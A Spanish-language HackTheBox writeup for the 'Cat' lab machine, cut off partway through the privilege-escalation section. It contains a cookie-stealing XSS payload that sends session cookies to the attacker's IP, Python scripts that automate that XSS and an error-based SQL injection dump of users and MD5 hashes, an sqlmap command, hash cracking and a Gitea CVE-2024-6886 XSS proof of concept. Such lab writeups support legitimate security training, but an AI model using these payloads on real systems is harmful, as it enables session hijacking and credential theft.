---
title: Cat - Medium (HTB)
permalink: /Cat-HTB-Writeup/
tags:
  - "Linux"
  - "Medium"
  - "Git"
  - "XSS"
  - "SQL Injection"
  - "Hash Cracking"
  - "adm Group"
  - "Local Port Forwarding"
  - "SSH"
  - "Gitea"
  - "CVE-2024-6886"
  - "Python Scripting"
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
seo_tittle: Cat - Medium (HTB)
seo_description: Practica explotación de XSS y SQLi en diferentes servicios web para vencer Cat.
excerpt: Practica explotación de XSS y SQLi en un servicio web, abuso de configuraciones inseguras y explotación de CVE-2024-6886 (Gitea) para vencer Cat.
header:
  overlay_image: /assets/images/headers/cat-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/cat-hackthebox.jpg
---


![image-center](/assets/images/posts/cat-hackthebox.png)
{: .align-center}

**Habilidades:** Abusing Exposed `git` Repository, Cross-Site Scripting (Stored), SQL Injection - Error Based, Hash Cracking, Abusing `adm` Group Permissions, Local Port Forwarding, `Gitea` 1.22.0 Stored Cross-Site Scripting (CVE-2024-6886), Credentials Leakage, Python Scripting (XSS, SQLi)
{: .notice--primary}

# Introducción

Cat es una máquina Linux de dificultad `Medium` en HackTheBox que requiere explotación de vulnerabilidades web tales como Cross-Site Scripting y SQL Injection para ganar acceso inicial. Configuraciones inseguras y explotación de un CVE en `Gitea` 1.22.0 nos permitirán ganar acceso privilegiado y obtener control total sobre la máquina.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c 1 10.10.11.53
PING 10.10.11.53 (10.10.11.53) 56(84) bytes of data.
64 bytes from 10.10.11.53: icmp_seq=1 ttl=63 time=220 ms

--- 10.10.11.53 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 220.237/220.237/220.237/0.000 ms
~~~


## Nmap Scanning 

Realizaremos un escaneo de puertos con el fin de identificar puertos abiertos en la máquina víctima

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.53 -oG openPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-01 14:36 EDT
Nmap scan report for 10.10.11.53
Host is up (0.23s latency).
Not shown: 65409 closed tcp ports (reset), 124 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 21.63 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Haremos un segundo escaneo frente a los puertos que descubrimos con el propósito de identificar la versión y el servicio que ejecutan

~~~ bash
nmap -p 22,80 -sVC 10.10.11.53 -oN services                         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-01 14:36 EDT
Nmap scan report for cat.htb (10.10.11.53)
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
|_  256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-git: 
|   10.10.11.53:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Cat v1 
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Best Cat Competition
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.09 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Tenemos dos servicios expuestos, `ssh` y `http`. Podemos ver que el servidor web redirige a `cat.htb`, debemos agregar este nombre de dominio a nuestro archivo `/etc/hosts` para que nuestro sistema pueda hacer la resolución DNS necesaria

~~~ bash
10.10.11.53 cat.htb
~~~


## Web Analysis

Podemos escanear las tecnologías web que el servidor emplea para gestionar el contenido de la web en caso de que existiera algún CMS

~~~ bash
whatweb http://cat.htb                                 
http://cat.htb [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.53], Title[Best Cat Competition]
~~~

Si visitamos la web veremos lo siguiente. ¡Un sitio sobre una competición de gatos!

![image-center](/assets/images/posts/cat-web-analysis.png)
{: .align-center}

En la sección `Join`, podemos registrarnos con un nuevo usuario. Cuando creamos una cuenta, veremos que se actualiza la URL con los datos que hemos cargado, esta no es una muy buena práctica

~~~ bash
http://cat.htb/join.php?username=andrew&email=test%40test.com&password=pass123&registerForm=Register
~~~

Una vez hayamos creado una cuenta, iniciaremos sesión y se nos mostrará el siguiente formulario 

![image-center](/assets/images/posts/cat-web-analysis-2.png)
{: .align-center}


## Fuzzing

Enviaremos solicitudes al servidor en base a un diccionario de rutas posibles, con el propósito de verificar si existen

~~~ bash
gobuster dir -u http://cat.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt      
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cat.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git/config          (Status: 200) [Size: 92]
/.git                 (Status: 301) [Size: 301] [--> http://cat.htb/.git/]
/.git/HEAD            (Status: 200) [Size: 23]
/.git/index           (Status: 200) [Size: 1726]
/.git/logs/           (Status: 403) [Size: 272]
/.htaccess            (Status: 403) [Size: 272]
/.htpasswd            (Status: 403) [Size: 272]
/.hta                 (Status: 403) [Size: 272]
~~~
<br>


# Intrusión / Explotación
---
## Abusing Exposed `Git` Repository

Vemos que la ruta `.git` existe en este servidor web. Al intentar navegar hasta ella, el servidor nos rechaza el acceso. Podemos abusar de esta ruta expuesta para reconstruir el repositorio de forma local

Utilizaremos la herramienta [GitTools](https://github.com/internetwache/GitTools) para descargar los archivos del directorio `.git` que se encuentra expuesto en el servidor

~~~ bash
./gitdumper.sh http://cat.htb/.git/ repo
~~~

Una vez la descarga haya concluido, nos ubicaremos en el directorio que elegimos para construir el repositorio

~~~ bash
cd repo
ls -la 

total 0
drwxr-xr-x 1 root        root          8 Jul  2 23:49 .
drwxr-xr-x 1 incommatose incommatose  48 Jul  2 23:49 ..
drwxr-xr-x 1 root        root        118 Jul  2 23:49 .git
~~~

Utilizaremos el comando `git` para restaurar los archivos al commit más cercano (puedes comprobar la cantidad de `commits` con el comando `git log`)

~~~ bash
git restore .

ls -la
total 56
drwxr-xr-x 1 root        root         288 Jul  2 23:56 .
drwxr-xr-x 1 incommatose incommatose   48 Jul  2 23:49 ..
-rwxr-xr-x 1 root        root         893 Jul  2 23:56 accept_cat.php
-rwxr-xr-x 1 root        root        4496 Jul  2 23:56 admin.php
-rwxr-xr-x 1 root        root         277 Jul  2 23:56 config.php
-rwxr-xr-x 1 root        root        6676 Jul  2 23:56 contest.php
drwxr-xr-x 1 root        root          20 Jul  2 23:56 css
-rwxr-xr-x 1 root        root        1136 Jul  2 23:56 delete_cat.php
drwxr-xr-x 1 root        root         118 Jul  2 23:56 .git
drwxr-xr-x 1 root        root          50 Jul  2 23:56 img
drwxr-xr-x 1 root        root          50 Jul  2 23:56 img_winners
-rwxr-xr-x 1 root        root        3509 Jul  2 23:56 index.php
-rwxr-xr-x 1 root        root        5891 Jul  2 23:56 join.php
-rwxr-xr-x 1 root        root          79 Jul  2 23:56 logout.php
-rwxr-xr-x 1 root        root        2725 Jul  2 23:56 view_cat.php
-rwxr-xr-x 1 root        root        1676 Jul  2 23:56 vote.php
drwxr-xr-x 1 root        root          60 Jul  2 23:56 winners
-rwxr-xr-x 1 root        root        3374 Jul  2 23:56 winners.php
~~~

Vemos que existe una gran cantidad de archivos `.php` en este repositorio, algunos pueden ser interesantes, tales como: `admin.php` o `config.php`


## Project Analysis

Analizaremos los archivos PHP con el fin de identificar credenciales almacenadas en los archivos o vulnerabilidades asociadas a funcionalidades en la web.

### Cross-Site Scripting

En el archivo `join.php`, veremos que no se sanitiza correctamente los parámetros `username`, `email` y `password` antes de guardarlos en la base de datos, esto podría desencadenar `XSS` al inyectar código `javascript` en estos parámetros

~~~ php
// Registration process
if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['registerForm'])) {
    $username = $_GET['username']; # Se obtienen los parámetros desde la URL
    $email = $_GET['email'];
    $password = md5($_GET['password']);

    $stmt_check = $pdo->prepare("SELECT * FROM users WHERE username = :username OR email = :email");
    $stmt_check->execute([':username' => $username, ':email' => $email]);
    $existing_user = $stmt_check->fetch(PDO::FETCH_ASSOC);
    ...
    ...
    ...
~~~

### SQL Injection

El archivo `accept_cat.php` ejecuta una consulta SQL hacia una base de datos. Sin embargo, no sanitiza el parámetro `catName` antes de ejecutar la query

~~~ php
            $cat_name = $_POST['catName'];
            $catId = $_POST['catId'];
            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
            $pdo->exec($sql_insert);
~~~

Si intentamos hacer una solicitud a `accept_cat.php`, se nos deniega el acceso, porque no tenemos permisos administrativos

~~~ bash
curl -X POST http://cat.htb/accept_cat.php

Access denied.# 
~~~

### Username

En archivos como `admin.php`, podremos ver comprobaciones para el nombre de usuario `axel`. Podría ser que este usuario sea válido en la máquina víctima

~~~ php
if (!isset($_SESSION['username']) || $_SESSION['username'] !== 'axel') {
        if (isset($_SESSION['username'])) {
            if ($_SESSION['username'] == 'axel') {
~~~


## Cross-Site Scripting (XSS)

Aprovecharemos que el parámetro `username` no se sanitiza, intentaremos cargar una imagen, que cuando lance un error (que forzamos nosotros), enviará las cookies mediante una solicitud HTTP a nuestra IP

~~~ bash
<img src=x onerror="document.location='http://10.10.14.180/?cookie='+document.cookie">
~~~

> Utilizaremos el `payload` anterior para crear un usuario nuevo, e iniciaremos sesión con el mismo `payload` como nombre de usuario
{: .notice--warning}

![image-center](/assets/images/posts/cat-xss-analysis.png)
{: .align-center}

Una vez que hayamos iniciado sesión correctamente, registraremos un nuevo gato en  `contest.php`, no sin antes iniciar un servidor HTTP

~~~ bash
sudo python3 -m http.server 80
~~~

![image-center](/assets/images/posts/cat-xss-analysis-2.png)
{: .align-center}

Al cabo de unos momentos, recibiremos una solicitud HTTP con una cookie diferente a la que tenemos, muy posiblemente sea la **cookie de sesión de administración**

~~~ bash
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.53 - - [03/Jul/2025 13:11:32] "GET /?cookie=PHPSESSID=lif6it2n99p7ep9it85pkdui6n HTTP/1.1" 200 -
10.10.11.53 - - [03/Jul/2025 13:11:32] code 404, message File not found
10.10.11.53 - - [03/Jul/2025 13:11:32] "GET /favicon.ico HTTP/1.1" 404 -
~~~ 

### Python Scripting

De forma alternativa, podemos automatizar este proceso con un sencillo script de `python3` 

~~~ python
import requests
import sys
import urllib.parse
import http.server
import threading
import socketserver
import time
import signal

def exploit_xss(evil_username, username_encoded):
    print(f"[*] Creating a evil user...")

    register_url = f"http://cat.htb/join.php?username={evil_username}{username_encoded}&email={evil_username}%40{evil_username}.com&password=pass123&registerForm=Register"
    r = session.get(register_url)
    print("[+] Evil user was created successfully!")
    print(f"[+] Payload: {username_encoded}")
    print("[*] Logging into the web application as the evil user on: http://cat.htb/join.php...")

    login_url = f"http://cat.htb/join.php?loginUsername={evil_username}{username_encoded}&loginPassword=pass123&loginForm=Login"
    r = session.get(login_url)

    phpsessid = session.cookies.get('PHPSESSID')
    if phpsessid:
        print(f"[+] Evil user cookie: PHPSESSID={phpsessid}")
        return phpsessid
    else:
        print("[!] There is no PHPSESSID cookie!")
        return


def send_cat(url, cookie, image_path):
    data = {
        'cat_name': 'Test',
        'age': '1',
        'birthdate': '1111-11-11',
        'weight': '1'
    }

    files = { 'cat_photo': ('cat.jpeg', open(image_path, 'rb'), 'image/jpeg') }
    cookies = { "PHPSESSID": cookie }
    response = requests.post(url, cookies=cookies, data=data, files=files)
    
    if response.status_code == 200 and "Cat has been successfully sent for inspection" in response.text:
        print(f"[+] Payload injected successfully!")
        
    elif "Error: Only JPG, JPEG, and PNG files are allowed." in response.text:
        print("[-] Error with image file format")
    else:
        print("[-] Error in HTTP request")


class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        global captured_cookie
        parsed_path = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed_path.query)

        if "cookie" in query:
            captured_cookie = query['cookie'][0]
            print(f"[+] Admin cookie: {captured_cookie}")
            
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

# Reuse HTTP Local Server
class ReusableTCPServer(socketserver.TCPServer):
    allow_reuse_address = True

def start_http_server():
    with ReusableTCPServer(("", PORT), Handler) as httpd:
        print(f"\n[*] Waiting for requests on http://0.0.0.0:{PORT}")
        httpd.handle_request()

def def_handler(sig, frame):
    print("[!] Ctrl+C detected, exiting...")
    exit(1)


if __name__ == "__main__":
    session = requests.Session()
    signal.signal(signal.SIGINT, def_handler)
    captured_cookie = None

    if len(sys.argv) > 1:    
        PORT = 8000
        attacker_ip = sys.argv[1]
        image_path = sys.argv[2]
        evil_username = sys.argv[3] if len(sys.argv) > 3 else "foo"
        xss_payload = f"<img src=x onerror=\"document.location='http://{attacker_ip}:{PORT}/?cookie='+document.cookie\">"
        username_encoded = requests.utils.quote(xss_payload)

        phpsessid = exploit_xss(evil_username, username_encoded)

        if phpsessid:
            send_cat("http://cat.htb/contest.php", phpsessid, image_path)

        # Threads
        server_thread = threading.Thread(target=start_http_server, daemon=True)
        server_thread.start()
        elapsed = 0
        timeout = 30

        while captured_cookie is None and elapsed < timeout:
            time.sleep(1)
            elapsed += 1

        if captured_cookie:
            phpsessid = captured_cookie.split("PHPSESSID=")[-1].split(";")[0]

        server_thread.join()

    else:
        print("[*] Usage: python3 xss.py <attacker_ip> <junk_username>")
        print("[*] Parameters:\n")
        print("<attacker_ip> IP address to send requests from victim machine.")
        print("<image_path> Image file (necessary for valid cat registration), only JPG, JPEG, and PNG files are allowed.")
        print("<junk_username> Optional parameter, it's just for create a unique username in each request.\n")
~~~

> Para utilizar este script debemos disponer de la imagen que vayamos a cargar en el directorio actual
{: .notice--warning}

Podemos ejecutar el script de la siguiente manera, donde enviamos nuestra IP para iniciar automáticamente un servidor HTTP que reciba la cookie a través de la solicitud que haría la víctima

~~~ bash
python3 xss.py 10.10.14.180 cat.jpeg  
 
[*] Creating a evil user...
[+] Evil user was created successfully!
[+] Payload: %3Cimg%20src%3Dx%20onerror%3D%22document.location%3D%27http%3A//10.10.14.180%3A8000/%3Fcookie%3D%27%2Bdocument.cookie%22%3E
[*] Logging into the web application as the evil user on: http://cat.htb/join.php...
[+] Evil user cookie: PHPSESSID=s9eubfjagupdhrpm7j6sdbos7q
[+] Payload injected successfully!

[*] Waiting for requests on http://0.0.0.0:8000
[+] Admin cookie: PHPSESSID=tlan3ciceailj8551medtje6hg
10.10.11.53 - - [05/Jul/2025 13:48:59] "GET /?cookie=PHPSESSID=lif6it2n99p7ep9it85pkdui6n HTTP/1.1" 200 -
~~~

Podemos insertar la cookie en el navegador desde las herramientas de desarrollador

![image-center](/assets/images/posts/cat-cookie-hijacking.png)
{: .align-center}

Ya podremos acceder a `/admin.php` y utilizar la siguiente funcionalidad, veremos el gato que registramos

![image-center](/assets/images/posts/cat-admin-session.png)
{: .align-center}


## SQL Injection - Error Based

Con la sesión de administración, tendremos acceso al archivo `accept_cat.php` y que podría ser vulnerable a SQL Injection

~~~ bash
curl -X POST http://cat.htb/accept_cat.php -b 'PHPSESSID=lif6it2n99p7ep9it85pkdui6n'

Error: Cat ID or Cat Name not provided.# 
~~~

Interceptaremos una solicitud HTTP y la modificaremos para enviar solicitudes a `accept_cat.php`

> Enviaremos la cookie `PHPSESSID` de administración que obtuvimos mediante XSS en la solicitud
{: .notice--warning}

![image-center](/assets/images/posts/cat-burpsuite.png)
{: .align-center}

Utilizaremos el parámetro `catName`, que en teoría es vulnerable debido a que **no se sanitiza antes de ser enviado en la query SQL**. Podemos utilizar una query basada en error y en función del código de estado (`200 (Ok)` o `500 (Internal Server Error)`) sabremos que nuestra query se ejecuta correctamente.

~~~ sql
test'||1/(substr((select username from users limit 0,1),1,1)='a')||'
~~~

- `||`: Concatenar `strings` dentro de una query.
- `1/(...)`: División, si el denominador es `0` (`false`), ocurrirá un error.
- `substr((select username from users limit 0,1),1,1)='a'`: Extrae el primer caracter del primer `username` y se compara con un caracter que nosotros controlamos.

### `sqlmap`

Podemos usar la herramienta `sqlmap` para automatizar la explotación de `SQLi` en este contexto. Utilizaremos el parámetro `-r` para indicar la solicitud que debemos enviar. Primero guarda la solicitud tal como se ve en `Burpsuite` en un archivo, por ejemplo `request.txt`

> Considera la renovación de la cookie `PHPSESSID` de administración, debido a que periódicamente cambia
{: .notice--danger}

~~~ bash
sqlmap -r request.txt -p catName --level 5 --dump --risk 3 --dbms sqlite --batch --threads 10
~~~

### Python Scripting

Opcionalmente podemos utilizar un script en `python` que automatiza la explotación de este escenario de `SQLi`, en mi caso he construido (junto a `chatGPT`) el siguiente

~~~ python
import requests, time, string, signal, sys, threading
from pwn import log

username_charset = string.ascii_lowercase
md5_charset = string.hexdigits.lower()
md5_charset = ''.join(sorted(set(md5_charset)))
usernames = []
passwords = []
lock = threading.Lock()
stop_event = threading.Event()

def def_handler(sig, frame):
    print("[!] Ctrl+C detected, exiting...")
    stop_event.set()
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def dump_single_user(url, phpsessid, row, bar_payload, bar_user):
    actual_user = ""
    cookies = {"PHPSESSID": phpsessid}
    try:
        for char_position in range(1,10):
            for char in username_charset:
                if stop_event.is_set():
                    return
                payload = f"test'||1/(substr((select username from users limit {row},1),{char_position},1)='{char}')||'"
                data = {
                        "catName": payload,
                        "catId": 1 
                }

                bar_payload.status(payload)
                response = requests.post(url=url, data=data, cookies=cookies)
                if response.status_code == 200:
                    actual_user += char
                    bar_user.status(actual_user)
                    break 
    except Exception as e:
        log.error("Error" + str(e))

    with lock:
        usernames.append((row, actual_user))

def dump_usernames(url, phpsessid):
    threads = []

    bars_payload = [log.progress(f"[Row {i}] Payload") for i in range(5)]
    bars_user = [log.progress(f"[Row {i}] Username") for i in range(5)]

    for row in range(0, 5):
        t = threading.Thread(target=dump_single_user, args=(url, phpsessid, row, bars_payload[row], bars_user[row]))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    for _, user in sorted(usernames):
        log.success(f"Username: {user}")


def dump_single_password(url, phpsessid, row, bar_payload, bar_pass):
    actual_pass = ""
    cookies = {"PHPSESSID": phpsessid}
    try:
        for char_position in range(1,32):
            for char in md5_charset:
                if stop_event.is_set():
                    return
                payload = f"test'||1/(substr((select password from users limit {row},1),{char_position},1)='{char}')||'"
                data = {
                        "catName": payload,
                        "catId": 1 
                }

                bar_payload.status(payload)

                response = requests.post(url=url, data=data, cookies=cookies)
                if response.status_code == 200:
                    actual_pass += char
                    bar_pass.status(actual_pass)
                    break 
    except Exception as e:
        log.error("Error" + str(e))

    with lock:
        passwords.append((row, actual_pass))


def dump_passwords(url, phpsessid):
    threads = []

    bars_payload = [log.progress(f"[Row {i}] Payload") for i in range(5)]
    bars_pass = [log.progress(f"[Row {i}] Password") for i in range(5)]

    for row in range(0,5):
        t = threading.Thread(target=dump_single_password, args=(url, phpsessid, row, bars_payload[row], bars_pass[row]))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()


    for _, password in sorted(passwords):
        log.success(f"Password: {password} (MD5)")

if __name__ == '__main__':
    
    vulnerable_url = "http://cat.htb/accept_cat.php"
    admin_cookie = sys.argv[1]

    bar = log.progress("Dupming usernames from the database...")
    dump_usernames(vulnerable_url, admin_cookie)
    bar2 = log.progress("Dumping passwords from the database...")
    dump_passwords(vulnerable_url, admin_cookie)
    
    usernames_sorted = sorted(usernames)
    passwords_sorted = sorted(passwords)

    log.success("Dumped credentials")
    for (row_u, user), (row_p, passwd) in zip(usernames_sorted, passwords_sorted):
        if row_u == row_p:
            print(f"{user}:{passwd}")
~~~

> Recuerda renovar la cookie `PHPSESSID` antes de ejecutar el script debido a que puede demorar el tiempo suficiente como para que se invalide
{: .notice--danger}

Ejecutaremos el script enviando la cookie `PHPSESSID`de administración que obtuvimos anteriormente

~~~ bash
python3 sqli.py gvl0v3uokjg02npau09dqo5gu8 

[▃] Dupming usernames from the database...
[<] [Row 0] Payload: test'||1/(substr((select username from users limit 0,1),9,1)='z')||'
[┤] [Row 1] Payload: test'||1/(substr((select username from users limit 1,1),9,1)='z')||'
[..../...] [Row 2] Payload: test'||1/(substr((select username from users limit 2,1),9,1)='z')||'
[▁] [Row 3] Payload: test'||1/(substr((select username from users limit 3,1),9,1)='z')||'
[◐] [Row 4] Payload: test'||1/(substr((select username from users limit 4,1),9,1)='z')||'
[ ] [Row 0] Username: axel
[ ] [Row 1] Username: rosa
[.] [Row 2] Username: jerryson
[↙] [Row 3] Username: larry
[◢] [Row 4] Username: royer
[+] Username: axel
[+] Username: rosa
[+] Username: jerryson
[+] Username: larry
[+] Username: royer
[◐] Dumping passwords from the database...
[←] [Row 0] Payload: test'||1/(substr((select password from users limit 0,1),31,1)='2')||'
[ ] [Row 1] Payload: test'||1/(substr((select password from users limit 1,1),31,1)='8')||'
[.] [Row 2] Payload: test'||1/(substr((select password from users limit 2,1),31,1)='8')||'
[.] [Row 3] Payload: test'||1/(substr((select password from users limit 3,1),31,1)='f')||'
[o] [Row 4] Payload: test'||1/(substr((select password from users limit 4,1),31,1)='f')||'
[.\......] [Row 0] Password: d1bbba3670feb9435c9841e46e60ee2
[◐] [Row 1] Password: ac369922d560f17d63eb8b2c7dec498
[▘] [Row 2] Password: 781593e060f8d065cd7281c5ec5b4b8
[◐] [Row 3] Password: 1b6dce240bbfbc0905a664ad199e18f
[▄] [Row 4] Password: c598f6b844a36fa7836fba0835f1f6
[+] Password: d1bbba3670feb9435c9841e46e60ee2 (MD5)
[+] Password: ac369922d560f17d63eb8b2c7dec498 (MD5)
[+] Password: 781593e060f8d065cd7281c5ec5b4b8 (MD5)
[+] Password: 1b6dce240bbfbc0905a664ad199e18f (MD5)
[+] Password: c598f6b844a36fa7836fba0835f1f6 (MD5)
[+] Dumped credentials
axel:d1bbba3670feb9435c9841e46e60ee2
rosa:ac369922d560f17d63eb8b2c7dec498
jerryson:781593e060f8d065cd7281c5ec5b4b8
larry:1b6dce240bbfbc0905a664ad199e18f
royer:c598f6b844a36fa7836fba0835f1f6
~~~


## Hash Cracking

Guardaremos el hash en un archivo para intentar descifrarlo por fuerza bruta empleando el diccionario `rockyou.txt`, si no queremos hacerlo desde la terminal, podemos utilizar webs como [`hashes.com`](https://hashes.com/en/decrypt/hash) o [`crackstation.net`](https://crackstation.net/)

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=Raw-MD5           
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
soyunaprincesarosa (?)     
1g 0:00:00:00 DONE (2025-07-03 15:38) 5.000g/s 18024Kp/s 18024Kc/s 18024KC/s soyxingona..soyunamagalinda
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
~~~


## Shell as `rosa`

Con las credenciales obtenidas, podremos conectarnos a la máquina con el usuario `rosa`

~~~ bash
ssh rosa@cat.htb                                                                                                                    
rosa@cat.htb\'s password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)
...
...
Last login: Sat Sep 28 15:44:52 2024 from 192.168.1.64
rosa@cat:~$ export TERM=xterm
~~~

Realizando una enumeración básica de usuarios, descubriremos que existen: `axel`, `jobert` y `git`

~~~ bash
rosa@cat:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
axel:x:1000:1000:axel:/home/axel:/bin/bash
rosa:x:1001:1001:,,,:/home/rosa:/bin/bash
git:x:114:119:Git Version Control,,,:/home/git:/bin/bash
jobert:x:1002:1002:,,,:/home/jobert:/bin/bash
~~~


## Abusing `adm` Group Permissions

El usuario `rosa` es miembro del grupo `adm`, este grupo nos permite leer ciertos archivos de `logs`, más detalles en [esta publicación](https://medium.com/@evyeveline1/im-in-the-adm-group-can-i-escalate-yes-eventually-9475b968b97a)

~~~ bash
rosa@cat:~$ id
uid=1001(rosa) gid=1001(rosa) groups=1001(rosa),4(adm)
~~~

Anteriormente descubrimos que **las credenciales se reflejan en la URL**, analizaremos el archivo de logs de `apache` en busca de credenciales. Veremos la contraseña del usuario `axel`

~~~ bash
rosa@cat:~$ cat /var/log/apache2/access.log | grep -E "axel" | awk '{print $7}' | sort -u

/join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login
~~~


## Shell as `axel`

Migraremos al usuario `axel` utilizando la contraseña que encontramos en los logs de `apache`

~~~ bash
rosa@cat:~$ su axel
Password: 
axel@cat:/home/rosa$ id
uid=1000(axel) gid=1000(axel) groups=1000(axel)
~~~

Ya podremos ver la flag del usuario sin privilegios

~~~ bash
axel@cat:/home/rosa$ cd
axel@cat:~$ cat user.txt 
89c...
~~~
<br>


# Escalada de Privilegios
---
## Finding Privilege Escalation Path

Una vez que nos encontramos dentro de la máquina como el usuario `axel`, podemos enumerar vías potenciales para escalar privilegios. A continuación puedes ver técnicas comunes utilizadas en sistemas Linux.

### Sudoers Privileges

Siempre deberíamos comprobar si tenemos privilegios asignados a nivel de `sudoers`, aunque no dispongamos de la contraseña

~~~ bash
rosa@cat:~$ sudo -l
~~~

### SUID Binaries

Algunos binarios con el bit `suid` habilitado suponen cierto riesgo de escalada de privilegios, podemos enumerarlos de la siguiente manera

~~~ bash
rosa@cat:~$ find / -perm -4000 2>/dev/null
~~~


## Internally Open Ports

Listaremos los puertos que están abiertos de forma local, veremos diversos servicios, como el puerto `3000` o el puerto `25`

~~~ bash
axel@cat:~$ ss -tunl | grep 127.0.0.1
tcp    LISTEN  0       1            127.0.0.1:41175        0.0.0.0:*            
tcp    LISTEN  0       4096         127.0.0.1:3000         0.0.0.0:*            
tcp    LISTEN  0       10           127.0.0.1:25           0.0.0.0:*            
tcp    LISTEN  0       128          127.0.0.1:42571        0.0.0.0:*            
tcp    LISTEN  0       10           127.0.0.1:587          0.0.0.0:*            
tcp    LISTEN  0       37           127.0.0.1:44211        0.0.0.0:*
~~~


## Local Port Forwarding

Haremos visibles estos servicios para poder analizarlos con nuestra máquina atacante

~~~ bash
ssh axel@cat.htb -L 3000:127.0.0.1:3000 -L 25:127.0.0.1:25 -fN
~~~


## Web Analysis - `gitea`

El servicio en el puerto `3000` corresponde a `Gitea`. Podemos ver la versión en el `footer`

![image-center](/assets/images/posts/cat-gitea.png)
{: .align-center}


## `Gitea` 1.22.0 Stored Cross-Site Scripting (CVE-2024-6886)

La versión `1.22.0` de `gitea` es vulnerable a XSS debido a una [neutralización incorrecta](https://cwe.mitre.org/data/definitions/79.html) de entradas del usuario en los repositorios.

El campo de descripción de repositorios permiten inyectar código `javascript` que se almacena de forma permanente (`Stored XSS`). Luego, cuando un usuario ejecuta una acción determinada, el script se ejecuta y puede ocasionar ciertas acciones maliciosas.

### Proof of Concept

Existe una prueba de concepto en `exploitdb` que podemos utilizar. Crearemos un nuevo repositorio e inyectaremos una etiqueta de enlace en la descripción

~~~ html
<a href=javascript:alert()>XSS Test</a>
~~~

![image-center](/assets/images/posts/cat-gitea-2.png)
{: .align-center}

Seguiremos las instrucciones para establecer el repositorio con un primer `commit`

~~~ bash
touch README.md
git init
git checkout -b main
git add README.md
git commit -m "first commit"
git remote add origin http://localhost:3000/axel/Test.git
git push -u origin main
~~~

Recargaremos el repositorio en el navegador y al hacer clic en la descripción veremos el cuadro de `alert()`

![image-center](/assets/images/posts/cat-gitea-3.png)
{: .align-center}

### Mail

Encontraremos el siguiente mensaje en el "buzón de correos" de la máquina víctima. Donde se nos comenta el plan de lanzamiento de proyectos relacionados con gatos. Se nos solicita **enviar un correo electrónico** a `jobert@localhost` con la información de nuestro repositorio de `Gitea`.

~~~ bash
axel@cat:~$ cat /var/mail/axel
...
...
Subject: New cat services

Hi Axel,

We are planning to launch new cat-related web services, including a cat care website and other projects. Please send an email to jobert@localhost with information about your Gitea repository. Jobert will check if it is a promising service that we can develop.

Important note: Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository.

...
...
...
Subject: Employee management

